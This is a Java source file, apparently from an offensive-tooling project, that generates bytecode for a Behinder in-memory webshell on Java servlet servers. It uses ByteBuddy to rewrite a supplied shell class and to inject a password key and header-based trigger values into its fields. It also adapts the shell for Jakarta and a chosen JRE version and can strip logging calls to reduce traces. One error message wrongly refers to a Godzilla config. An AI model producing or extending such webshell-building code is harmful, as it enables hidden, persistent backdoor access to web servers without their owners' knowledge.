package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.BehinderConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FieldAccessor;
import net.bytebuddy.implementation.SuperMethodCall;
import net.bytebuddy.matcher.ElementMatchers;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderGenerator {
    private final ShellConfig shellConfig;
    private final BehinderConfig behinderConfig;

    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig behinderConfig) {
        this.shellConfig = shellConfig;
        this.behinderConfig = behinderConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (behinderConfig.getShellClass() == null) {
            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(behinderConfig.getPass())) {
            throw new IllegalArgumentException("behinderConfig.getPass().isBlank()");
        }
        String md5Key = DigestUtils.md5Hex(behinderConfig.getPass()).substring(0, 16);

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(behinderConfig.getShellClass())
                .name(behinderConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .constructor(ElementMatchers.any())
                .intercept(SuperMethodCall.INSTANCE
                        .andThen(FieldAccessor.ofField("pass").setsValue(md5Key))
                        .andThen(FieldAccessor.ofField("headerName").setsValue(behinderConfig.getHeaderName()))
                        .andThen(FieldAccessor.ofField("headerValue").setsValue(behinderConfig.getHeaderValue())));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }
        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}
